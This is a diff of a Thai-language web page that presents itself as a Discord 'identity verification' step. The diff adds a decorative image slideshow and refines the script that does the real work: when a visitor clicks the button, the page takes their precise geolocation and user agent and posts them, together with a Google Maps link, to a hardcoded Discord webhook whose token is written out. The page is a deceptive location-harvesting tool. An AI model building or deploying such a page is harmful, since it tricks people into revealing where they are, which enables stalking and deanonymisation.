@@ -1,29 +1,133 @@
 <!DOCTYPE html>
-<html>
+<html lang="th">
 <head>
-  <meta charset="UTF-8">
-  <title>Skidibi To Welcome</title>
+  <meta charset="UTF-8" />
+  <title>ยืนยันตัวตนด้วยตำแหน่ง + สไลด์รูป</title>
+  <style>
+    body {
+      font-family: "Sarabun", sans-serif;
+      background: #f0f4f8;
+      color: #333;
+      text-align: center;
+      padding: 40px 20px;
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    h2 {
+      font-size: 2rem;
+      margin-bottom: 30px;
+    }
+
+    button {
+      background-color: #4caf50;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 1.2rem;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      box-shadow: 0 5px 10px rgba(76, 175, 80, 0.4);
+    }
+
+    button:hover {
+      background-color: #45a049;
+    }
+
+    #status {
+      margin-top: 25px;
+      font-size: 1.1rem;
+      min-height: 30px;
+      color: #555;
+      white-space: pre-line;
+    }
+
+    #status.success {
+      color: #2e7d32;
+    }
+
+    #status.error {
+      color: #d32f2f;
+    }
+
+    #status.loading {
+      color: #1565c0;
+    }
+
+    /* สไตล์รูปภาพสไลด์ */
+    #slideshow {
+      margin: 30px auto;
+      max-width: 400px;
+      max-height: 400px;
+      border-radius: 15px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      object-fit: cover;
+      transition: opacity 0.5s ease-in-out;
+    }
+  </style>
 </head>
 <body>
-  <h2>📍 ยืนยันตัวตน discord</h2>
+  <h2>📍 ยืนยันตัวตน</h2>
+  
+  <!-- รูปภาพสำหรับสไลด์ -->
+  <img id="slideshow" src="https://i.pinimg.com/originals/8c/b2/88/8cb288daa036f41d26e5bf9118360ccd.jpg" alt="Slideshow Image" />
+
   <button onclick="getLocation()">📤 กดยืนยันตัวตน</button>
-  <p id="status">ยังไม่มีการส่งข้อมูล</p>
+  <p id="status">ยังไม่มีการยืนยัน</p>
 
   <script>
+    // โค้ดสไลด์รูปภาพ
+    const images = [
+      "https://i.pinimg.com/originals/8c/b2/88/8cb288daa036f41d26e5bf9118360ccd.jpg",
+      "https://i.pinimg.com/originals/ed/9c/9e/ed9c9eaa6c4bf77e4e89a50f5293e3d0.jpg",
+      "https://i.pinimg.com/originals/45/fb/67/45fb67d1e8d29ac96f3e393da9279f6a.jpg"
+    ];
+
+    let currentIndex = 0;
+    const slideshowEl = document.getElementById("slideshow");
+
+    function changeImage() {
+      currentIndex = (currentIndex + 1) % images.length;
+      slideshowEl.style.opacity = 0;
+      setTimeout(() => {
+        slideshowEl.src = images[currentIndex];
+        slideshowEl.style.opacity = 1;
+      }, 500);
+    }
+
+    setInterval(changeImage, 3000); // เปลี่ยนรูปทุก 3 วินาที
+
+    // --- โค้ดยืนยันตัวตนด้วยตำแหน่ง (เดิม) ---
     const webhookUrl = "https://discord.com/api/webhooks/1381107593946202214/TUZFgWXhHIRUiQv28wgTtvbZz7tDZB--rXcLy1EyN7oE4FXkNfu7VrBtBBUVQDJRT-9u";
 
+    const statusEl = document.getElementById("status");
+
+    function setStatus(text, type = "") {
+      statusEl.innerText = text;
+      statusEl.className = "";
+      if (type) statusEl.classList.add(type);
+    }
+
     function getLocation() {
-      document.getElementById("status").innerText = "⏳ กําลังไป..";
+      setStatus("⏳ กําลังไป..", "loading");
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendToDiscord, showError);
+        navigator.geolocation.getCurrentPosition(sendToDiscord, showError, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
       } else {
-        document.getElementById("status").innerText = "❌ เบราว์เซอร์ไม่รองรับ";
+        setStatus("❌ เบราว์เซอร์ไม่รองรับ", "error");
       }
     }
 
     function sendToDiscord(position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
+      const lat = position.coords.latitude.toFixed(6);
+      const lon = position.coords.longitude.toFixed(6);
       const mapUrl = https://www.google.com/maps?q=${lat},${lon};
       const userAgent = navigator.userAgent;
 
@@ -33,25 +137,37 @@
 
       fetch(webhookUrl, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data)
       })
       .then(response => {
         if (response.ok) {
-          document.getElementById("status").innerText = "✅ ยืนยันตัวตน Discord เรียบร้อยแล้ว!";
+          setStatus("✅ ยืนยันตัวตน Discord เรียบร้อยแล้ว!", "success");
         } else {
-          document.getElementById("status").innerText = "❌ ส่งข้อมูลไม่สำเร็จ";
+          setStatus("❌ ส่งข้อมูลไม่สำเร็จ", "error");
         }
       })
       .catch(error => {
-        document.getElementById("status").innerText = "❌ เกิดข้อผิดพลาด: " + error;
+        setStatus("❌ เกิดข้อผิดพลาด: " + error, "error");
       });
     }
 
     function showError(error) {
-      document.getElementById("status").innerText = "❌ ไม่สามารถระบุตำแหน่งได้ (" + error.message + ")";
+      let msg = "";
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          msg = "ผู้ใช้ปฏิเสธ";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          msg = "ไม่สามารถระบุได้";
+          break;
+        case error.TIMEOUT:
+          msg = "หมดเวลาในการระบุ";
+          break;
+        default:
+          msg = error.message;
+      }
+      setStatus("❌ ไม่สามารถระบุตำแหน่งได้ (" + msg + ")", "error");
     }
   </script>
 </body>
